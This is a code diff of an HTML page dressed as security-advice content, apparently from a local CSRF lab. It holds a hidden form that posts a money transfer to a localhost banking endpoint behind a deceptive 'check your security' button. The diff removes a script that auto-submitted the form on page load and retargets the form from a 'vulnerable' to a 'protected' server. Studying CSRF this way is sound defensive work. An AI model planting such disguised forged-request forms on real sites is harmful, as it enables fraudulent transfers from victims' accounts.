@@ -45,22 +45,12 @@ With cyber attacks on the rise, it’s more important than ever to install antiv
     </li><li><b>Anti-spyware software: </b>Blocks the installation of spyware on your computer, which can monitor or control your computer use and send you pop-ups or redirect you to malicious websites
     </li></ul>
                     </ol>
-    <form id="tform1" action = "http://localhost:8080/CSRF/vulnerable_server/transfermoney.php"  method = "POST">
+    <form id="tform1" action = "http://localhost:8080/CSRF/protected_server/transfermoney.php"  method = "POST">
         <input name = "destination address" type = "hidden" value = "0002"/>
         <input name = "amount" type = "hidden" value = "1"/>
         <button type = "submit" >Make sure your account is secure! Check the RBi Guidelines here! </button>
     </form>
-<script type="text/javascript">
 
-function formAutoSubmit () {
-var frm = document.getElementById("tform1");
-frm.submit();
-
-}
-
-window.onload = formAutoSubmit;
-
-</script>
     <iframe name="my_frame" style="display:none;"></iframe>
     </div>
 </div>
